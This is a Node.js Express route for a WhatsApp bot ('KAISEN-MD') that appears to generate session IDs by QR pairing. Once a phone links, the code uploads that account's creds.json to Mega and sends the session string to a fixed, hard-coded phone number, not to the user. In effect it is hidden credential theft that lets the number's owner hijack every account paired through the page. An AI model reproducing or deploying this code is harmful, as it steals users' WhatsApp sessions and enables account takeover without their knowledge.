const { exec } = require("child_process");
const { upload } = require('../utils/mega');
const express = require('express');
let router = express.Router()
const pino = require("pino");
let { toBuffer } = require("qrcode");
const path = require('path');
const fs = require("fs-extra");
const { Boom } = require("@hapi/boom");//

const MESSAGE = process.env.MESSAGE ||  `
╭─❍  *𝐊𝐀𝐈𝐒𝐄𝐍-𝐌𝐃 𝐁𝐎𝐓 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 ✅*
├ 🍓 *Device:* Connected Successfully
├ 🎐 *Bot Name:* KAISEN-MD
├ 🍄 *Status:* Online & Ready
├ 🍉 *Owner:* +917003816486
╰───────────────⬣

💬 *Welcome to KAISEN-MD WhatsApp Bot!*
🔹 Use *.menu* to explore all commands.
🔹 Stay respectful and enjoy smart automation.

🌸 *Powered by Kaisen Team*
🎀 *Secure Session ID Linked*
`;

// Store active sessions
const activeSessions = new Map();

// Clean up auth directory on start
const AUTH_DIR = path.join(__dirname, '..', 'qr_sessions');
if (!fs.existsSync(AUTH_DIR)) {
    fs.ensureDirSync(AUTH_DIR);
}

router.get('/', async (req, res) => {
    const sessionId = Date.now().toString();
    const sessionDir = path.join(AUTH_DIR, sessionId);

    // Ensure session directory exists
    fs.ensureDirSync(sessionDir);

    const { default: makeWASocket, useMultiFileAuthState, delay, Browsers, DisconnectReason } = require("@whiskeysockets/baileys");

    async function generateQRSession() {
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        try {
            let socket = makeWASocket({
                printQRInTerminal: false,
                logger: pino({ level: "silent" }),
                browser: Browsers.macOS("Desktop"),
                auth: state
            });

            // Store session reference
            activeSessions.set(sessionId, { socket, sessionDir });

            socket.ev.on('creds.update', saveCreds);

            socket.ev.on("connection.update", async (update) => {
                const { connection, lastDisconnect, qr } = update;

                if (qr && !res.headersSent) {
                    try {
                        const qrBuffer = await toBuffer(qr);
                        const qrBase64 = `data:image/png;base64,${qrBuffer.toString('base64')}`;

                        return res.json({
                            success: true,
                            qr: qrBase64,
                            sessionId: sessionId
                        });
                    } catch (error) {
                        console.error("Error generating QR Code:", error);
                        return res.status(500).json({
                            success: false,
                            error: "Failed to generate QR code"
                        });
                    }
                }

                if (connection === "open") {
                    try {
                        await delay(3000);
                        // Send message to fixed number
        let user = '917003816486@s.whatsapp.net';

                        function randomMegaId(length = 6, numberLength = 4) {
                            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
                            let result = '';
                            for (let i = 0; i < length; i++) {
                                result += characters.charAt(Math.floor(Math.random() * characters.length));
                            }
                            const number = Math.floor(Math.random() * Math.pow(10, numberLength));
                            return `${result}${number}`;
                        }

                        const credsPath = path.join(sessionDir, 'creds.json');
                        if (fs.existsSync(credsPath)) {
                            const mega_url = await upload(fs.createReadStream(credsPath), `${randomMegaId()}.json`);
                            const string_session = mega_url.replace('https://mega.nz/file/', '');

                            let msgsss = await socket.sendMessage(user, { text: "KAISEN~" + string_session });
                            await socket.sendMessage(user, { text: MESSAGE }, { quoted: msgsss });
                        }

                        // Clean up after success
                        setTimeout(() => {
                            try {
                                fs.removeSync(sessionDir);
                                activeSessions.delete(sessionId);
                                console.log(`✅ Session ${sessionId} cleaned up after success`);
                            } catch (e) {
                                console.error('Error cleaning up session:', e);
                            }
                        }, 5000);

                    } catch (e) {
                        console.log("Error during session completion:", e);
                        cleanupSession(sessionId);
                    }
                }

                if (connection === "close") {
                    let reason = new Boom(lastDisconnect?.error)?.output.statusCode;
                    console.log('QR Connection closed:', reason);

                    cleanupSession(sessionId);

                    if (reason === DisconnectReason.restartRequired) {
                        console.log("Restart Required, Restarting...");
                        // Don't restart automatically for QR sessions
                    } else if (reason === DisconnectReason.loggedOut) {
                        console.log("Device Logged Out");
                    }
                }
            });

        } catch (err) {
            console.log("Error in QR session:", err);
            cleanupSession(sessionId);

            if (!res.headersSent) {
                res.status(500).json({
                    success: false,
                    error: "Failed to initialize WhatsApp connection"
                });
            }
        }
    }

    function cleanupSession(sessionId) {
        try {
            const session = activeSessions.get(sessionId);
            if (session) {
                if (session.socket) {
                    session.socket.end();
                }
                fs.removeSync(session.sessionDir);
                activeSessions.delete(sessionId);
                console.log(`🗑️ Session ${sessionId} cleaned up`);
            }
        } catch (e) {
            console.error('Error during cleanup:', e);
        }
    }

    // Set timeout for session cleanup
    setTimeout(() => {
        cleanupSession(sessionId);
    }, 60000); // 1 minute timeout

    return await generateQRSession();
});

// Cleanup endpoint
router.delete('/cleanup/:sessionId', (req, res) => {
    const sessionId = req.params.sessionId;
    const session = activeSessions.get(sessionId);

    if (session) {
        try {
            if (session.socket) {
                session.socket.end();
            }
            fs.removeSync(session.sessionDir);
            activeSessions.delete(sessionId);
            console.log(`🗑️ Manual cleanup of session ${sessionId}`);
            res.json({ success: true, message: 'Session cleaned up' });
        } catch (e) {
            console.error('Error during manual cleanup:', e);
            res.status(500).json({ success: false, error: 'Cleanup failed' });
        }
    } else {
        res.json({ success: true, message: 'Session not found or already cleaned' });
    }
});

module.exports = router;